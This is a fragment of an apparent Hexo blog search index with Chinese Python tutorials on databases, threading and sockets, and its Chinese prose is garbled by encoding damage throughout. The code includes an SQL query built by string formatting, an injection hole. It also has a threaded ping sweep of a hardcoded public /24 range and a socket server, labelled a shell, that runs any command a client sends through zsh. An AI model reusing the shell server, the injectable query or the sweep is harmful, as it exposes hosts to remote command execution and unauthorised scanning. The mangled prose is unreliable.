        <tag>è¿›ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-æ•°æ®åº“ç¼–ç¨‹]]></title>
    <url>%2Fposts%2F57831%2F</url>
    <content type="text"><![CDATA[Python DBA APIåŒ…å«çš„å†…å®¹ è®¿é—®æ•°æ®åº“æµç¨‹ ä¸MySQLimport pymysql db_config = { 'host': '127.0.0.1', 'user': 'hhh', 'password': '123', 'db': 'test', 'charset': 'utf8' } # æ’å…¥ try: conn = pymysql.connect(**db_config) cursor = conn.cursor() # æ’å…¥ id = '2018002' name = 'admin' age = 18 # insert into student values(id,name,age) sql = 'insert into student(id, name, age) values(%s,%s,%s)' cursor.execute(sql, (id, name, age)) # åˆ é™¤ # table = 'students' # condittion = 'age > 20' # sql = 'delete from {table} where {condittion}'.format(table=table, condittion=condittion) # æŸ¥è¯¢ sql = "SELECT password FROM admin WHERE name='%s'" % (name) cursor.execute(sql) pws = cursor.fetchall() except: print('error') conn.rollback() finally: conn.commit() # æ•°æ®æœ‰å˜åŠ¨ä¸€å®šè®°å¾—æäº¤/åŒä¿é™© cursor.close() conn.close() cursorå¯¹è±¡æ”¯æŒçš„æ–¹æ³• ä¸MongoDBfrom pymongo import * #å»ºç«‹è¿æ¥ client = MongoClient('127.0.0.1',27017) #æŒ‡å®šæ•°æ®åº“ db = client.test #æŒ‡å®šé›†åˆ collection = db.col # print(type(collection),collection) # pythonè¿æ¥mongodbå°±æå®š mydict ={ '_id': 6, 'name': 'admin', 'age': 18, 'addr': 'didu' } # collection.insert(mydict) # print(collection.find()) # for i in collection.find(): # print(i) # for i in collection.find({'name':'zhanglinlin'}): # print(i) collection.update({'name':'zhanglinlin'},{'$set':{'age':22}},{'mult':'true'}) # collection.remove() ä¸redisimport redis # # è¿æ¥,ç»™å®šå‚æ•°ip/portï¼Œ redisé»˜è®¤ç«¯å£6379 r = redis.Redis(host='127.0.0.1', port='6379') # # print(type(r),r) # # # è®¾ç½®é”®å€¼å¯¹ r.set('name', 'admin') # # è·å–è¯¥é”®çš„å€¼ str = r.get('name') print(str.decode('utf-8')) # è§£ç  ## è‡ªåŠ¨è§£ç  å‚æ•°ï¼šdecode_responses=True r = redis.Redis(host='127.0.0.1',port='6379',decode_responses=True) r.set('name','å“ˆå“ˆ') str = r.get('name') print(str) ## StrictRedis r = redis.StrictRedis(host='127.0.0.1',port='6379') r.set('name','å“ˆå“ˆ') str = r.get('name') print(str,str.decode('utf-8')) ## `Redis`å’Œ`StrictRedis`åŒºåˆ«ï¼šRediså…¼å®¹æ—§ç‰ˆæœ¬python2 # k_v = { 'a1':'a', 'a2':'b', 'a3':'c' } r = redis.StrictRedis(host='127.0.0.1',port='6379') # æ‰¹é‡è®¾ç½®å€¼ r.mset(**k_v) # æ‰¹é‡å–å€¼ print(r.mget('a1','a2','a3')) # r = redis.StrictRedis(host='127.0.0.1',port='6379') # å¾€åˆ—è¡¨æ·»åŠ å€¼ä»å¤´éƒ¨å¼€å§‹ r.lpush('list1','haha') r.lpush('list1',3,4,5) # è·å–åˆ—è¡¨å€¼ print(r.lrange('list1',0,-1)) # r = redis.StrictRedis(host='127.0.0.1',port='6379') r.sadd('set1','aa') r.sadd('set2','aa',8,10,'bb') print(r.smembers('set2')) ä¸memcachedimport memcache # å»ºç«‹è¿æ¥ mc = memcache.Client(['127.0.0.1:11211'], debug=True) # è®¾ç½®ä¸€ä¸ª mc.set('name', 'xps',time=60) # è®¾ç½®å¤šä¸ª mc.set_multi({"username":"handsome", "gender":"man"}, time=60) # è·å–ä¸€ä¸ª mc.get('age') # è·å–å¤šä¸ª # ä¸ç®¡æ˜¯å…ƒç»„è¿˜æ˜¯åˆ—è¡¨éƒ½è¡Œï¼Œåªè¦å¯è¿­ä»£å°±è¡Œ res1 = mc.get_multi(("username", "gender")) res2 = mc.get_multi(["username", "gender"]) print(res1) print(res2) # åˆ é™¤ä¸€ä¸ª mc.delete("key") # åˆ é™¤å¤šä¸ª mc.delete_multi(["key1", "key2"]) """ # 0è¡¨ç¤ºæ°¸ä¸è¿‡æœŸ æ–­ç”µå°±ä¼šå®Œè›‹ é€‚åˆåšéªŒè¯ç  # prepend å‰æ’ # append åæ’ # telnet ip port è¿œç¨‹è¿æ¥ """ è¿™é‡Œä»…ä»…åšäº†ç®€å•çš„ä»‹ç»ï¼Œå…·ä½“è¿˜éœ€è¦è‡ªå·±ç»ƒä¹ ä¸­å­¦ä¹  document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-å¤šçº¿ç¨‹]]></title>
    <url>%2Fposts%2F59675%2F</url>
    <content type="text"><![CDATA[è®²è§£è¿›ç¨‹æ˜¯ç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œã€‚æ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±çš„åœ°å€ç©ºé—´ã€å†…å­˜ã€æ•°æ®æ ˆä»¥åŠå…¶ä»–è®°å½•è¿è¡Œè½¨è¿¹çš„è¾…åŠ©æ•°æ® çº¿ç¨‹æ‰€æœ‰çš„çº¿ç¨‹è¿è¡Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹å½“ä¸­ï¼Œå…±äº«ç›¸åŒçš„è¿è¡Œç¯å¢ƒã€‚çº¿ç¨‹æœ‰ï¼šå¼€å§‹ã€é¡ºåºæ‰§è¡Œã€ç»“æŸ ä¸‰ä¸ªéƒ¨åˆ†ã€‚å¤šä¸ªçº¿ç¨‹ååŒå®Œæˆä¸€ä¸ªè¿›ç¨‹çš„ä»»åŠ¡ã€‚ æˆ‘ä»¬åœ¨ç¼–å†™å®‰å…¨å·¥å…·çš„æ—¶å€™ï¼Œä½¿ç”¨å¤šçº¿ç¨‹è¦æ›´å¤šäº›(ä½¿ç”¨å¤šè¿›ç¨‹ç›¸å¯¹è¾ƒå°‘) thread ç¼ºç‚¹ï¼šç¨‹åºå¤æ‚æ—¶ï¼Œä¸èƒ½è®¡ç®—çº¿ç¨‹æ•°é‡å’Œæ§åˆ¶ï¼Œç¨³å®šæ€§ä¸å¤ªå¥½ ä½¿ç”¨_thread.start_new_thread(ping_check, (ip,)) ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å›è°ƒå‡½æ•°ï¼Œç¬¬äºŒä¸ªçš„å¯å˜å‚æ•°(tupleç±»å‹çš„) Noteï¼š å¿…é¡»é…åˆtime.sleep() å®ä¾‹: """ ä½¿ç”¨pingæ£€æŸ¥Cæ®µæœºå™¨(ä¸€ä¸ªCæ®µæ˜¯0-255) """ import _thread import time import re from subprocess import Popen,PIPE def ping_check(ip_addr): # ä¸€ä¸ªæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ¨¡å— check = Popen(['/bin/bash', '-c', 'ping -c 2 '+ip_addr], stdin=PIPE,stdout=PIPE) data = check.stdout.read() # è¿”å›çš„æ•°æ® if 'ttl' in str(data): print("{} is up".format(ip_addr)) def main(ip_three): for i in range(255): ip = ip_three + '.' + str(i) _thread.start_new_thread(ping_check, (ip,)) time.sleep(0.1) if __name__ == '__main__': ip_three = input("è¾“å…¥ipåœ°å€çš„å‰ä¸‰ä¸ªå­—èŠ‚(ä¸éœ€è¦æœ€åä¸€ä¸ªç‚¹): \n") # åˆ¤æ–­æœ€åæ˜¯å¦æœ‰ç‚¹ pattern = r'\.$' has_point = re.findall(pattern, ip_three) if has_point: ip_three = ip_three[:-1] print(ip_three) main(ip_three) threading (é‡ç‚¹)1.Theadç±» ä½¿ç”¨threadingæ¨¡å— å­ç±»åŒ–Threadç±» è§£å†³äº†çº¿ç¨‹æ•°é‡å¯æ§çš„é—®é¢˜ ç®€å•ä¾‹å­ï¼š import threading import time import requests def func1(key): print("Hello %s:%s"%(key, time.ctime())) print(threading.current_thread()) # å½“å‰çº¿ç¨‹ print("*"*20) def main(): threads = [] keys = ['å¼ ä¸‰', 'æå››', 'ç‹äº”', 'é™†å¤§äºº'] threads_count = len(keys) # ç”Ÿæˆå‚æ•°é•¿åº¦ä¸ªçº¿ç¨‹æ•° for i in range(threads_count): t = threading.Thread(target=func1, args=(keys[i],)) threads.append(t) # çº¿ç¨‹åŠ å…¥çº¿ç¨‹åˆ—è¡¨ # å¯åŠ¨çº¿ç¨‹ for i in range(threads_count): threads[i].start() # ç­‰å¾…çº¿ç¨‹ç»“æŸ join() for i in range(threads_count): threads[i].join() # ä¿è¯ã€æ‰€æœ‰ã€‘çš„çº¿ç¨‹éƒ½ä¼šç»“æŸ å†è¿è¡Œä¸»çº¿ç¨‹ é‡åˆ°joinä¼šé˜»å¡ if __name__ == '__main__': main() å®ä¾‹: """ å¯¹ç™¾åº¦ä»¥10ä¸ªçº¿ç¨‹è®¿é—®10æ¬¡ """ import threading import time import requests import sys def func1(): time_start = time.time() r = requests.get(url='http://www.baidu.com') times = time.time() - time_start # è€—æ—¶ sys.stdout.write("Status:%s---%s---%s"%(r.status_code, times, time.strftime("%H:%M:%S"))) # å½“å‰æ—¶é—´ print("") def main(): threads = [] threads_count = 10 # å®šä¹‰ çº¿ç¨‹æ•° # ç”Ÿæˆå‚æ•°é•¿åº¦ä¸ªçº¿ç¨‹æ•° for i in range(threads_count): t = threading.Thread(target=func1) threads.append(t) # çº¿ç¨‹åŠ å…¥çº¿ç¨‹åˆ—è¡¨ # å¯åŠ¨çº¿ç¨‹ for i in range(threads_count): threads[i].start() # ç­‰å¾…çº¿ç¨‹ç»“æŸ join() for i in range(threads_count): threads[i].join() # ä¿è¯ã€æ‰€æœ‰ã€‘çš„çº¿ç¨‹éƒ½ä¼šç»“æŸ å†è¿è¡Œä¸»çº¿ç¨‹ é‡åˆ°joinä¼šé˜»å¡ if __name__ == '__main__': main() 2.ç”Ÿäº§è€…-æ¶ˆè´¹è€…é—®é¢˜ å’Œ Queueæ¨¡å— (é‡ä¸­ä¹‹é‡)\ Queueæ¨¡å—[ qsize(), empty(), full(), put(), get() ] å®Œç¾æ­æ¡£ï¼šQueue + Thread è§£å†³äº†ç”Ÿäº§å‚æ•°å’Œè®¡ç®—ç»“æœæ—¶é—´éƒ½ä¸ç¡®å®šçš„é—®é¢˜ æœ€å¸¸ä½¿ç”¨ Queueï¼š å°†äº§ç”Ÿçš„è´§ç‰©æ”¾åˆ°Queueä¸­ï¼Œæ¶ˆè´¹è€…ä»Queueä¸­æ‹¿æ•°æ® import Queue q = queue.Queue(100) # å¯ä»¥ç›´æ¥æŒ‡å®šé˜Ÿåˆ—çš„å¤§å° for i in range(10): q.put(i) # ä¹Ÿå¯ä»¥è¿™æ ·æ”¾å…¥ q.empty() # æŸ¥çœ‹æ˜¯å¦ä¸ºç©º q.qsize() # æŸ¥çœ‹å¤§å° q.get() # ä¾æ¬¡å–å‡ºæ•°æ® q.full() # æ˜¯å¦æ»¡äº† queue.task_done() # å‘Šè¯‰é˜Ÿåˆ—ï¼Œè¿™ä¸ªä»»åŠ¡æ‰§è¡Œå®Œæˆäº† ç”Ÿäº§è€…æ¶ˆè´¹è€…è®²è§£ï¼š """ æ‰€è°“ï¼Œç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…æ¨¡å‹ï¼Œå…¶å®æ˜¯æŠŠä¸€ä¸ªéœ€è¦è¿›ç¨‹é€šä¿¡çš„é—®é¢˜åˆ†å¼€è€ƒè™‘ ç”Ÿäº§è€…ï¼Œåªéœ€è¦å¾€é˜Ÿåˆ—é‡Œé¢ä¸¢ä¸œè¥¿ï¼ˆç”Ÿäº§è€…ä¸éœ€è¦å…³å¿ƒæ¶ˆè´¹è€…ï¼‰ æ¶ˆè´¹è€…ï¼Œåªéœ€è¦ä»é˜Ÿåˆ—é‡Œé¢æ‹¿ä¸œè¥¿ï¼ˆæ¶ˆè´¹è€…ä¹Ÿä¸éœ€è¦å…³å¿ƒç”Ÿäº§è€… ç”Ÿäº§è€…ï¼š åªå…³å¿ƒé˜Ÿåˆ—æ˜¯å¦å·²æ»¡ã€‚ æ²¡æ»¡ï¼Œåˆ™ç”Ÿäº§ï¼Œæ»¡äº†å°±é˜»å¡ã€‚ æ¶ˆè´¹è€…ï¼š åªå…³å¿ƒé˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºã€‚ ä¸ä¸ºç©ºï¼Œåˆ™æ¶ˆè´¹ï¼Œä¸ºç©ºåˆ™é˜»å¡ã€‚ """ from threading import Thread # çº¿ç¨‹ import random import queue import threading import time class Produce(Thread): def __init__(self, queue): super().__init__() self.queue = queue def run(self): while True: item = random.randint(0,99) if self.queue.full(): print("å½“å‰é˜Ÿåˆ—é•¿åº¦{}".format(self.queue.qsize())) self.queue.put(item) # åªè¦é˜Ÿåˆ—æ²¡æ»¡ï¼Œ å‘é˜Ÿåˆ—å­˜å…¥æ•°æ® print("ç”Ÿäº§è€…%s ==> å·²ç»ç”Ÿäº§ %s, å¹¶å°†å…¶åŠ å…¥åˆ°äº†é˜Ÿåˆ—ä¸­" %(threading.current_thread(),item)) class Consumer(Thread): def __init__(self, queue): super().__init__() self.queue = queue def run(self): while True: item = self.queue.get() # åªè¦é˜Ÿåˆ—ä¸ä¸ºç©ºï¼Œ å°±ä»é˜Ÿåˆ—ä¸­å–å‡ºæ•°æ® print("æ¶ˆè´¹è€… ==> ä»é˜Ÿåˆ—ä¸­å–å‡º %s" %item) self.queue.task_done() # å‘Šè¯‰é˜Ÿåˆ—ï¼Œè¿™ä¸ªä»»åŠ¡æ‰§è¡Œå®Œæˆäº† if __name__ == '__main__': q = queue.Queue(10000) p = Produce(q) p1 = Produce(q) c = Consumer(q) p.start() p1.start() time.sleep(5) c.start() å®ä¾‹ï¼š """ ä½¿ç”¨ threding å’Œ Quque ç»“åˆï¼Œ ping_check """ import threading import queue # æ³¨æ„æ˜¯å°å†™ from subprocess import Popen,PIPE import sys # ç»§æ‰¿å¤šçº¿ç¨‹çš„ç±» class DoRun(threading.Thread): def __init__(self, queue): # threading.Thread.__init__(self) super().__init__() self._queue = queue # é‡å†™äº†runæ–¹æ³• def run(self): # å¦‚æœQueueä¸ä¸ºç©ºå°±ç»§ç»­æ‰§è¡Œ while not self._queue.empty(): ip = self._queue.get() check_ping = Popen(['/bin/bash','-c','ping -c 2 '+ip], stdin=PIPE, stdout=PIPE) data = check_ping.stdout.read() if 'ttl' in str(data): sys.stdout.write(ip + " is up") print() def main(): threads = [] threads_count = 10 # åˆ›å»ºä¸€ä¸ªç©ºçš„é˜Ÿåˆ— q = queue.Queue() # putåˆ°é˜Ÿåˆ— for i in range(1,255): q.put("123.206.96."+str(i)) # å¤šçº¿ç¨‹ for i in range(threads_count): threads.append(DoRun(q)) # å¯åŠ¨ for i in threads: i.start() for i in threads: i.join() if __name__ == '__main__': main() document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>å¤šçº¿ç¨‹</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python-socketç¼–ç¨‹]]></title>
    <url>%2Fposts%2F15426%2F</url>
    <content type="text"><![CDATA[è®²è§£C/Sæ¶æ„å®¢æˆ·æœºå’ŒæœåŠ¡å™¨ç»“æ„Serverå”¯ä¸€çš„ç›®çš„å°±æ˜¯ç­‰å¾…clientçš„è¯·æ±‚ï¼Œclientè¿ä¸Šserverå‘é€å¿…è¦çš„æ•°æ®ï¼Œç„¶åç­‰å¾…serverç«¯å®Œæˆè¯·æ±‚çš„èŒƒé˜” C/Sç½‘ç»œç¼–ç¨‹Serverç«¯è¿›è¡Œè®¾ç½®ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªé€šä¿¡ç«¯ç‚¹ï¼Œè®©serverç«¯èƒ½å¤Ÿç›‘å¬è¯·æ±‚ï¼Œä¹‹åå°±è¿›å…¥ç­‰å¾…å’Œå¤„ç†Clientè¯·æ±‚çš„æ— é™å¾ªç¯ä¸­ Clientç¼–ç¨‹ç›¸å¯¹Serverç«¯ç¼–ç¨‹ç®€å•ï¼Œåªè¦åˆ›å»ºä¸€ä¸ªé€šä¿¡ç«¯ç‚¹ï¼Œå»ºç«‹åˆ°æœåŠ¡å™¨çš„è¿æ¥ï¼Œå°±å¯ä»¥æå‡ºwingæˆ‘å°±æ¥ å¥—æ¥å­—(socket)æ˜¯ä¸€ç§å…·æœ‰ä¹‹å‰æ‰€è¯´çš„â€œé€šä¿¡ç«¯ç‚¹â€æ¦‚å¿µçš„è®¡ç®—æœºç½‘ç»œæ•°æ®ç»“æ„ã€‚ç½‘ç»œåŒ–çš„åº”ç”¨ç¨‹åºåœ¨å¼€å§‹ä»»ä½•é€šè®¯ä¹‹å‰éƒ½å¿…é¡»åˆ›å»ºå¥—æ¥å­— å¥—æ¥å­— = (ip, ç«¯å£) Pythonæ”¯æŒ: - AF_UNIX â€“&gt; Unixä¸‹è¿›è¡Œé€šä¿¡çš„ - AF_NETLINK â€“&gt; æ˜¯Linuxä¸‹çš„å¥—æ¥å­— - AF_INET â€“&gt; æ˜¯åŸºäºç½‘ç»œçš„å¥—æ¥å­— ï¼ˆæˆ‘ä»¬ä¸‹é¢çš„é‡ç‚¹ï¼‰ Pythonçš„socketæ¨¡å—åˆ›å»ºTCP/IPå¥—æ¥å­—ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š # å‚æ•°ï¼ˆå¥—æ¥å­—å®¶æ—ï¼Œå¥—æ¥å­—ç±»å‹ï¼‰ # AF_INETï¼šåŸºäºç½‘ç»œçš„ï¼Œ SOCK_SREAMï¼šä»£è¡¨TCP/IP tcp_scoket = socket(socket.AF_INET, socket.SOCK_SREAM) å¥—æ¥å­—å¯¹è±¡çš„æ–¹æ³•ï¼š æœåŠ¡ç«¯å¥—æ¥å­—å‡½æ•°ï¼š å…¬å…±ç”¨é€”å¥—æ¥å­—å‡½æ•°ï¼š åˆ›å»ºè¿æ¥ä¹‹åè¦å…³é—­ å®ä¾‹:## 1.åˆ›å»º-ä¸ªTCPæœåŠ¡å™¨ SS. = socket() #åˆ›å»ºæœåŠ¡å™¨å¥—æ¥å­— ss.bind() #æŠŠåœ°å€ç»‘å®šåˆ°å¥—æ¥å­—ä¸Š s.listen() #ç›‘å¬è¿æ¥ inf loop; #æœåŠ¡å™¨æ— é™å¾ªç¯ CS.= ss.accept() #æ¥å—å®¢æˆ·ç«¯è¿æ¥ cmmon loop; #é€šä¿¡å¾ªç¯ s.recy0/cs.send0 #å¯¹è¯(æ¥å—ä¸å‘é€) cs.close0 #å…³é—­å®¢æˆ·ç«¯å¥—æ¥å­— ## 2ã€åˆ›å»ºä¸€ä¸ªTCPå®¢æˆ·ç«¯ cs.socket() #åˆ›å»ºå®¢æˆ·ç«¯å¥—æ¥å­— cs.connect() #å°è¯•è¿æ¥å¥—æ¥å­— common loop: #é€šä¿¡å¾ªç¯ cs.recx0/cs.send() #å¯¹è¯(æ¥å—ä¸å‘é€) cs.close() #å…³é—­å®¢æˆ·ç«¯å¥—æ¥å­— åå¼¹Shellï¼š åœ¨å®¢æˆ·ç«¯è·å–æœåŠ¡ç«¯çš„shell 1.è·å–Linuxçš„shellï¼š server.py """ åå¼¹shell """ import socket from subprocess import Popen,PIPE # æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ HOST = '' # å¦‚æœæ˜¯æœ¬æœºæœ€ä¸ºæœåŠ¡ç«¯ï¼Œåœ°å€å¯ä»¥ä¸ç”¨å¡«å†™ PORT = 8888 BUFSIZE = 1024 ADDR = (HOST,PORT) tcp_server = socket.socket() # typeé»˜è®¤æ˜¯tcp tcp_server.bind(ADDR) tcp_server.listen(5) print("å¼€å§‹ç›‘å¬") while True: # æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„å¾ªç¯è¿æ¥ print("Waiting fpr connecting...") coon, addr = tcp_server.accept() # è·å–å¯¹ç­‰å¥—æ¥å­—(conn), ä»¥åŠå®¢æˆ·ç«¯åœ°å€(addr). è¿™ä¸ªã€åªæ‰§è¡Œä¸€æ¬¡ã€‘ï¼Œæ”¾åˆ°å¤–é¢é˜²æ­¢é˜»å¡ print("... connected from:" + str(addr)) # ä¸‹é¢æ˜¯é€šä¿¡çš„å¾ªç¯ while True: data = coon.recv(BUFSIZE) # è¯»å–å®¢æˆ·ç«¯å‘é€çš„æ¶ˆæ¯ ï¼ˆæŒ‡æ˜ä¸€æ¬¡æ€§èƒ½æ¥æ”¶çš„æœ€å¤§å­—èŠ‚æ•°é‡ï¼‰ if data: try: # æ‰§è¡Œè·å–æœåŠ¡ç«¯çš„ç³»ç»Ÿå‘½ä»¤ï¼ˆåœ¨å®¢æˆ·ç«¯è¿æ¥åå¯ä»¥æ‰§è¡ŒæœåŠ¡ç«¯çš„å‘½ä»¤ï¼‰ cmd = Popen(['/bin/zsh', '-c', data], stdin=PIPE, stdout=PIPE) cmd_data = cmd.stdout.read() coon.send(cmd_data) except Exception: continue else: print("å®¢æˆ·ç«¯{}å·²æ–­å¼€".format(addr)) break 2.è·å–Windowçš„shellï¼š client.pyä¸å˜ import socket HOST = '' # å¦‚æœæ˜¯æœ¬æœºæœ€ä¸ºæœåŠ¡ç«¯ï¼Œåœ°å€å¯ä»¥ä¸ç”¨å¡«å†™ PORT = 8888 BUFSIZE = 1024 ADDR = (HOST,PORT) tcp_cient = socket.socket() tcp_cient.connect(ADDR) print("å®¢æˆ·ç«¯ï¼š\n") # æ•°æ®äº¤äº’å¾ªç¯ while True: msg = input('>>>') if msg: tcp_cient.send(msg.encode()) # åªèƒ½å‘é€ bytes ç±»å‹çš„æ•°æ® data = tcp_cient.recv(BUFSIZE) if not data: break print(data.decode()) else: break # tcp_cient.close() # c.close() # ä¸»åŠ¨æ–­å¼€ # æœåŠ¡ç«¯ä¼šrecvåˆ°ä¸€ä¸ªç©ºå­—ç¬¦ä¸² 1.é˜»å¡çš„å¥—æ¥å­— é˜»å¡å¥—æ¥å­—ä¸èƒ½å’Œå¤šä¸ªå®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ server.py """ æœåŠ¡ç«¯ï¼š é˜»å¡å¥—æ¥å­—ï¼š ---> é˜»å¡å¥—æ¥å­—ä¸èƒ½å’Œå¤šä¸ªå®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ """ import socket HOST = '' # å¦‚æœæ˜¯æœ¬æœºæœ€ä¸ºæœåŠ¡ç«¯ï¼Œåœ°å€å¯ä»¥ä¸ç”¨å¡«å†™ PORT = 8888 BUFSIZE = 1024 ADDR = (HOST,PORT) tcp_server = socket.socket() # typeé»˜è®¤æ˜¯tcp #tcp_server.bind(('',8888)) tcp_server.bind(ADDR) tcp_server.listen(5) # å¯ä»¥æŒ‚èµ·çš„æœ€å¤§è¿æ¥æ•° acceptå°±ä¸ç®—æŒ‚èµ· print("å¼€å§‹ç›‘å¬") while True: # æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„å¾ªç¯è¿æ¥ print("Waiting fpr connecting...") coon, addr = tcp_server.accept() # è·å–å¯¹ç­‰å¥—æ¥å­—(conn), ä»¥åŠå®¢æˆ·ç«¯åœ°å€(addr). è¿™ä¸ªã€åªæ‰§è¡Œä¸€æ¬¡ã€‘ï¼Œæ”¾åˆ°å¤–é¢é˜²æ­¢é˜»å¡ print("... connected from:" + str(addr)) # ä¸‹é¢æ˜¯é€šä¿¡çš„å¾ªç¯ while True: data = coon.recv(BUFSIZE) # è¯»å–å®¢æˆ·ç«¯å‘é€çš„æ¶ˆæ¯ ï¼ˆæŒ‡æ˜ä¸€æ¬¡æ€§èƒ½æ¥æ”¶çš„æœ€å¤§å­—èŠ‚æ•°é‡ï¼‰ if data: print(data.decode()) # å‘clientå‘é€æ”¶åˆ°çš„ä¿¡æ¯ coon.send(data) else: print("å®¢æˆ·ç«¯{}å·²æ–­å¼€".format(addr)) break #serverç«¯å…³é—­è¿æ¥ #tcp_server.close() #accpet é˜»å¡ recvé˜»å¡(è¯»ä¸åˆ°æ•°æ®ï¼Œå°±ä¸€ç›´ç­‰åˆ°æœ‰æ•°æ®ä¸ºæ­¢) client.py """ æœ€ç®€å•çš„å®¢æˆ·ç«¯ ä¸‰ç§æ–¹å¼çš„å®¢æˆ·ç«¯éƒ½æ˜¯ä¸€æ ·çš„ """ import socket HOST = '' # å¦‚æœæ˜¯æœ¬æœºæœ€ä¸ºæœåŠ¡ç«¯ï¼Œåœ°å€å¯ä»¥ä¸ç”¨å¡«å†™ PORT = 8888 BUFSIZE = 1024 ADDR = (HOST,PORT) tcp_cient = socket.socket() tcp_cient.connect(ADDR) print("å®¢æˆ·ç«¯ï¼š\n") # æ•°æ®äº¤äº’å¾ªç¯ while True: msg = input('>>>') if msg: tcp_cient.send(msg.encode()) # åªèƒ½å‘é€ bytes ç±»å‹çš„æ•°æ® data = tcp_cient.recv(BUFSIZE) if not data: break print(data.decode()) else: break # tcp_cient.close() # c.close() # ä¸»åŠ¨æ–­å¼€ # æœåŠ¡ç«¯ä¼šrecvåˆ°ä¸€ä¸ªç©ºå­—ç¬¦ä¸² 2.I/Oå¤šè·¯å¤ç”¨çš„å¥—æ¥å­—server.py """ æœåŠ¡ç«¯ I/Oå¤šè·¯å¤ç”¨ """ # IOå¤šè·¯å¤ç”¨ # epoll äº‹ä»¶é€šçŸ¥äº‹ä»¶ # IOäº‹ä»¶ è®¡ç®—æœº å¯è¯»äº‹ä»¶ï¼ˆæœ‰æ•°æ®äº†...ï¼‰ # é€šçŸ¥æœºåˆ¶ ï¼ˆæŸä¸€äº‹æƒ…å‘é€ä¹‹åï¼Œå¯è¯»ä¹‹åï¼‰ è½®è¯¢ # epollï¼š å½“socketå˜ä¸ºå¯è¯»çš„æ—¶å€™ï¼Œå‘å‡ºé€šçŸ¥ # epollï¼š æ˜¯æƒ°æ€§çš„äº‹ä»¶å›è°ƒï¼š æ“ä½œç³»ç»Ÿåªèµ·åˆ°é€šçŸ¥çš„ä½œç”¨ã€‚ # epollï¼š ç›®å‰Linuxä¸Šæ•ˆç‡æœ€é«˜çš„IOå¤šè·¯å¤ç”¨ æŠ€æœ¯ ï¼ # 1.ç›‘å¬å¥—æ¥å­— 2.å¯¹ç­‰å¥—æ¥å­— import socket import selectors # windowsæ²¡æœ‰epoll sel = selectors.DefaultSelector() # ä¼šæ ¹æ®ä¸åŒçš„æ“ä½œç³»ç»Ÿé€‰æ‹©ç›¸åº”çš„è§£é‡Šå™¨ åœ¨linuxæ˜¯epoll æ ¹æ®ç³»ç»Ÿè‡ªåŠ¨é€‰æ‹© sel2 = selectors.EpollSelector() # ä¼šæ ¹æ®ä¸åŒçš„æ“ä½œç³»ç»Ÿé€‰æ‹©ç›¸åº”çš„è§£é‡Šå™¨ åœ¨linuxæ˜¯epoll Linux server = socket.socket() server.bind(('127.0.0.1',8888)) server.listen(5) def accept(server): coon, addr = server.accept() sel.register(coon, selectors.EVENT_READ, read) def read(coon): data = coon.recv(1024) if data: print(data) server.send(data.encode()) else: print('Closing:',coon) sel.unregister(coon) # å–æ¶ˆç›‘å¬ coon.close() # æ³¨å†Œäº‹ä»¶ äº‹ä»¶è§¦å‘ç›´æ¥è°ƒç”¨ sel.register(server, selectors.EVENT_READ, accept) # ç›‘å¬äº‹ä»¶çš„å‘ç”Ÿ å‚æ•°ä¸‰ä¸ªï¼š å¥—æ¥å­—,å¯èƒ½å‘é€çš„äº‹ä»¶(å˜ä¸ºå¯è¯»äº‹ä»¶),å›è°ƒå‡½æ•° print("å¼€å§‹ç›‘å¬") while True: events_list = sel.select() # è¿”å›å‘ç”Ÿäº†äº‹ä»¶çš„åˆ—è¡¨ æŸ¥è¯¢å·²ç»å‡†å¤‡å¥½çš„å¥—æ¥å­— print("æœ‰å¥—æ¥å­—å‘ç”Ÿå˜åŒ–") for key, _ in events_list: # åˆ—è¡¨é‡Œé¢æ˜¯ä¸ªå…ƒç»„, keyæ˜¯å…ƒç»„é‡Œé¢çš„ç¬¬ä¸€ä¸ªå€¼ callback = key.data # æŸä¸ªå¥—æ¥å­—ç»‘å®šçš„å‡½æ•° key.dataæ˜¯å‡½æ•° callback(key.fileobj) # è°ƒç”¨è¿™ä¸ªå›è°ƒå‡½æ•° fileobjæ˜¯å¯¹åº”å¥—æ¥å­— # sel.select() æœ‰ä¸¤ç§æƒ…å†µï¼š #1. å®¢æˆ·ç«¯è¯·æ±‚è¿æ¥ key.dataæ˜¯accept key.fileobj æ˜¯server #2. å®¢æˆ·ç«¯è¯·æ±‚è¿æ¥ key.dataæ˜¯read key.fileobj æ˜¯conn """ 1.å…ˆåœ¨æŒ‡å®šçš„å¥—æ¥å­—ä¸Šæ³¨å†Œå¯¹åº”çš„äº‹ä»¶åŠå›è°ƒ 2.ä¸æ–­çš„æŸ¥è¯¢æ‰€æœ‰å·²ç»å‡†å¤‡å¥½èµ„æºçš„å¥—æ¥å­— 3.ä¸éœ€è¦è€ƒè™‘å¥—æ¥å­—ä¸äº‹ä»¶åªç®¡è°ƒç”¨ """ client.py ç›¸åŒ 3.éé˜»å¡çš„å¥—æ¥å­—server.py """ æœåŠ¡ç«¯ 